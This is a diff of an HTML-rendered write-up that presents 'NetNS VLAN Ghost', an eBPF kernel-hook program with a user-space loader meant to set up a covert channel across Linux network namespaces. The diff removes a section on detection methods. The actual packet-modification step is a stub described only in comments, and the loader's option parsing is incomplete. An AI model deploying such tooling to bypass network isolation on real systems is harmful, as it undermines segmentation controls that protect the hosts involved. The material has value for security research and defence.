+                    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">udph</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">udph</span><span class="p">),</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">eth</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">iph</span><span class="p">));</span>
+                    <span class="n">event</span><span class="p">.</span><span class="n">src_port</span> <span class="o">=</span> <span class="n">bpf_ntohs</span><span class="p">(</span><span class="n">udph</span><span class="p">.</span><span class="n">source</span><span class="p">);</span>
+                    <span class="n">event</span><span class="p">.</span><span class="n">dst_port</span> <span class="o">=</span> <span class="n">bpf_ntohs</span><span class="p">(</span><span class="n">udph</span><span class="p">.</span><span class="n">dest</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            
+            <span class="c1">// Send event to user space</span>
+            <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
         <span class="p">}</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook outgoing packets to add covert channel markers</span>
+<span class="c1">// Hook the network packet transmit function</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/dev_queue_xmit"</span><span class="p">)</span>
 <span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_transmit</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
 <span class="p">{</span>
-    <span class="c1">// Similar logic for outgoing packets</span>
-    <span class="c1">// Add VLAN tags or other markers for the receiving end</span>
+    <span class="c1">// Get network namespace information</span>
+    <span class="k">struct</span> <span class="n">net</span> <span class="o">*</span><span class="n">net</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">net</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">net</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">nd_net</span><span class="p">);</span>
+    
+    <span class="c1">// Get namespace ID</span>
+    <span class="n">u32</span> <span class="n">ns_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ns_id</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ns_id</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">net</span><span class="o">-&gt;</span><span class="n">ns</span><span class="p">.</span><span class="n">inum</span><span class="p">);</span>
+    
+    <span class="c1">// Check if this namespace is in our target list</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_namespace</span><span class="p">(</span><span class="n">ns_id</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// Extract packet headers</span>
+        <span class="k">struct</span> <span class="n">ethhdr</span> <span class="n">eth</span><span class="p">;</span>
+        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">eth</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">eth</span><span class="p">),</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+        
+        <span class="c1">// In a real exploit, we would now:</span>
+        <span class="c1">// 1. Add or modify VLAN tags to create a covert channel</span>
+        <span class="c1">// 2. Potentially modify the packet's content to include hidden data</span>
+        <span class="c1">// 3. Ensure the packet can be received by the target namespace</span>
+        
+        <span class="c1">// For demonstration, we'll just log the event</span>
+        <span class="k">struct</span> <span class="n">packet_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+        <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">src_ns</span> <span class="o">=</span> <span class="n">ns_id</span><span class="p">;</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">dst_ns</span> <span class="o">=</span> <span class="n">get_destination_namespace</span><span class="p">(</span><span class="n">ns_id</span><span class="p">);</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">bpf_ntohs</span><span class="p">(</span><span class="n">eth</span><span class="p">.</span><span class="n">h_proto</span><span class="p">);</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">action</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>  <span class="c1">// modify</span>
+        
+        <span class="c1">// Extract IP header if this is an IP packet</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">eth</span><span class="p">.</span><span class="n">h_proto</span> <span class="o">==</span> <span class="n">bpf_htons</span><span class="p">(</span><span class="n">ETH_P_IP</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">struct</span> <span class="n">iphdr</span> <span class="n">iph</span><span class="p">;</span>
+            <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">iph</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">iph</span><span class="p">),</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">eth</span><span class="p">));</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">src_ip</span> <span class="o">=</span> <span class="n">iph</span><span class="p">.</span><span class="n">saddr</span><span class="p">;</span>
+            <span class="n">event</span><span class="p">.</span><span class="n">dst_ip</span> <span class="o">=</span> <span class="n">iph</span><span class="p">.</span><span class="n">daddr</span><span class="p">;</span>
+            
+            <span class="c1">// Extract port information for TCP/UDP</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">iph</span><span class="p">.</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_TCP</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">struct</span> <span class="n">tcphdr</span> <span class="n">tcph</span><span class="p">;</span>
+                <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tcph</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">tcph</span><span class="p">),</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">eth</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">iph</span><span class="p">));</span>
+                <span class="n">event</span><span class="p">.</span><span class="n">src_port</span> <span class="o">=</span> <span class="n">bpf_ntohs</span><span class="p">(</span><span class="n">tcph</span><span class="p">.</span><span class="n">source</span><span class="p">);</span>
+                <span class="n">event</span><span class="p">.</span><span class="n">dst_port</span> <span class="o">=</span> <span class="n">bpf_ntohs</span><span class="p">(</span><span class="n">tcph</span><span class="p">.</span><span class="n">dest</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">iph</span><span class="p">.</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_UDP</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">struct</span> <span class="n">udphdr</span> <span class="n">udph</span><span class="p">;</span>
+                <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">udph</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">udph</span><span class="p">),</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">eth</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">iph</span><span class="p">));</span>
+                <span class="n">event</span><span class="p">.</span><span class="n">src_port</span> <span class="o">=</span> <span class="n">bpf_ntohs</span><span class="p">(</span><span class="n">udph</span><span class="p">.</span><span class="n">source</span><span class="p">);</span>
+                <span class="n">event</span><span class="p">.</span><span class="n">dst_port</span> <span class="o">=</span> <span class="n">bpf_ntohs</span><span class="p">(</span><span class="n">udph</span><span class="p">.</span><span class="n">dest</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        
+        <span class="c1">// Send event to user space</span>
+        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
+    <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
+
+<span class="c1">// TC program to intercept and modify packets at the traffic control layer</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"tc"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">tc_ingress</span><span class="p">(</span><span class="k">struct</span> <span class="n">__sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// This would be used in a more sophisticated implementation</span>
+    <span class="c1">// to modify packets at the TC layer, which provides more</span>
+    <span class="c1">// capabilities than kprobes</span>
+    
+    <span class="k">return</span> <span class="n">TC_ACT_OK</span><span class="p">;</span>
+<span class="p">}</span>
 </pre></td></tr></tbody></table></code></pre></div></div>
 
-<h3 id="detection-methods">Detection Methods</h3>
+<h3 id="user-space-control-program">User-Space Control Program</h3>
 
-<p>Defenders should monitor for:</p>
-<ul>
-  <li>Unexpected eBPF programs attached to network-related functions</li>
-  <li>Discrepancies in network traffic between different monitoring points</li>
-  <li>Unusual VLAN tag patterns or modifications</li>
-  <li>Unexpected cross-namespace communication</li>
-  <li>Traffic that appears on physical interfaces but not in namespace monitoring</li>
-</ul>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+</pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
+<span class="c1">// @copyable: true</span>
+<span class="c1">// User-space program to load and control the NetNS VLAN Ghost eBPF program</span>
 
-<p>This technique demonstrates why proper eBPF restrictions are critical for maintaining network isolation, especially in environments where network segmentation is a key security control.</p>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/libbpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/bpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">"netns_vlan_ghost.skel.h"</span><span class="cp">
+</span>
+<span class="k">static</span> <span class="k">volatile</span> <span class="n">bool</span> <span class="n">exiting</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+
+<span class="c1">// Structure for packet events (must match the BPF version)</span>
+<span class="k">struct</span> <span class="n">packet_event</span> <span class="p">{</span>
+    <span class="kt">uint32_t</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">comm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="kt">uint64_t</span> <span class="n">timestamp</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">src_ns</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">dst_ns</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">src_ip</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">dst_ip</span><span class="p">;</span>
+    <span class="kt">uint16_t</span> <span class="n">src_port</span><span class="p">;</span>
+    <span class="kt">uint16_t</span> <span class="n">dst_port</span><span class="p">;</span>
+    <span class="kt">uint16_t</span> <span class="n">vlan_id</span><span class="p">;</span>
+    <span class="kt">uint16_t</span> <span class="n">protocol</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">action</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="c1">// Handle events from the eBPF program</span>
+<span class="kt">void</span> <span class="nf">handle_event</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">data_sz</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">packet_event</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">timestamp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="kt">time_t</span> <span class="n">t</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">timestamp</span> <span class="o">/</span> <span class="mi">1000000000</span><span class="p">;</span>
+    <span class="n">strftime</span><span class="p">(</span><span class="n">timestamp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">timestamp</span><span class="p">),</span> <span class="s">"%Y-%m-%d %H:%M:%S"</span><span class="p">,</span> <span class="n">localtime</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t</span><span class="p">));</span>
+    
+    <span class="kt">char</span> <span class="n">src_ip</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="n">dst_ip</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="n">inet_ntop</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">src_ip</span><span class="p">,</span> <span class="n">src_ip</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">src_ip</span><span class="p">));</span>
+    <span class="n">inet_ntop</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">dst_ip</span><span class="p">,</span> <span class="n">dst_ip</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dst_ip</span><span class="p">));</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[%s] Process %d (%s): "</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">comm</span><span class="p">);</span>
+    
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">action_str</span> <span class="o">=</span> <span class="s">"Unknown"</span><span class="p">;</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">action</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">action_str</span> <span class="o">=</span> <span class="s">"Redirected"</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
+            <span class="n">action_str</span> <span class="o">=</span> <span class="s">"Modified"</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
+            <span class="n">action_str</span> <span class="o">=</span> <span class="s">"Dropped"</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s packet from namespace %u to %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">action_str</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">src_ns</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">dst_ns</span><span class="p">);</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">ETH_P_IP</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  IP: %s:%u -&gt; %s:%u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> 
+               <span class="n">src_ip</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">src_port</span><span class="p">,</span> 
+               <span class="n">dst_ip</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">dst_port</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">vlan_id</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  VLAN ID: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">vlan_id</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"  Protocol: 0x%04x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">protocol</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Add a namespace mapping</span>
+<span class="kt">void</span> <span class="nf">add_namespace_mapping</span><span class="p">(</span><span class="kt">int</span> <span class="n">map_fd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">src_ns</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dst_ns</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">uint32_t</span> <span class="n">src_key</span> <span class="o">=</span> <span class="n">src_ns</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">dst_value</span> <span class="o">=</span> <span class="n">dst_ns</span><span class="p">;</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="n">map_fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">src_key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dst_value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to add namespace mapping: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Added mapping: Namespace %d -&gt; Namespace %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">src_ns</span><span class="p">,</span> <span class="n">dst_ns</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// Enable or disable the covert channel</span>
+<span class="kt">void</span> <span class="nf">set_covert_channel</span><span class="p">(</span><span class="kt">int</span> <span class="n">map_fd</span><span class="p">,</span> <span class="n">bool</span> <span class="n">enabled</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">uint32_t</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">value</span> <span class="o">=</span> <span class="n">enabled</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="n">map_fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to set covert channel state: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Covert channel %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">enabled</span> <span class="o">?</span> <span class="s">"enabled"</span> <span class="o">:</span> <span class="s">"disabled"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">sig_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">exiting</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">print_usage</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">prog</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: %s [options]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">prog</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Options:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"  -m SRC:DST  Add namespace mapping (SRC -&gt; DST)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"  -e          Enable covert channel</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"  -d          Disable covert channel</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"  -h          Show this help</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">netns_vlan_ghost_bpf</span> <span class="o">*</span><span class="n">skel</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">perf_buffer</span> <span class="o">*</span><span class="n">pb</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">err</span><span class="p">,</span> <span class="n">opt</span><span class="p">;</span>
+    <span class="n">bool</span> <span class="n">enable_covert</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="n">bool</span> <span class="n">disable_covert</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+    
+    <span class="c1">// Parse command line arguments</span>
+    <span class="k">while</span> <span class="p">((</span><span class="n">opt</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="s">"m:edh"</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">switch</span> <span class="p">(</span><span class="n">opt</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">case</span> <span class="sc">'m'</span><span class="p">:</span>
+            <span class="k">case</span> <span class="sc">'e'</span><span class="p">:</span>
+                <span class="n">enable_covert</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="sc">'d'</span><span class="p">:</span>
+                <span class="n">disable_covert</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="sc">'h'</span><span class="p">:</span>
+                <span class="n">print_usage</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="nl">default:</span>
+                <span class="n">print_usage</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Set up signal handler</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+
+    <span class="c1">// Increase resource limits</span>
+    <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">rlim</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">RLIM_INFINITY</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="n">RLIM_INFINITY</span>
+    <span class="p">};</span>
+    <span class="n">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_MEMLOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
+
+    <span class="c1">// Load and verify BPF program</span>
+    <span class="n">skel</span> <span class="o">=</span> <span class="n">netns_vlan_ghost_bpf__open_and_load</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">skel</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to open and load BPF skeleton</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Attach BPF programs</span>
+    <span class="n">err</span> <span class="o">=</span> <span class="n">netns_vlan_ghost_bpf__attach</span><span class="p">(</span><span class="n">skel</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to attach BPF skeleton: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Set up perf buffer for events</span>
+    <span class="n">pb</span> <span class="o">=</span> <span class="n">perf_buffer__new</span><span class="p">(</span><span class="n">bpf_map__fd</span><span class="p">(</span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">maps</span><span class="p">.</span><span class="n">events</span><span class="p">),</span> <span class="mi">64</span><span class="p">,</span> <span class="n">handle_event</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
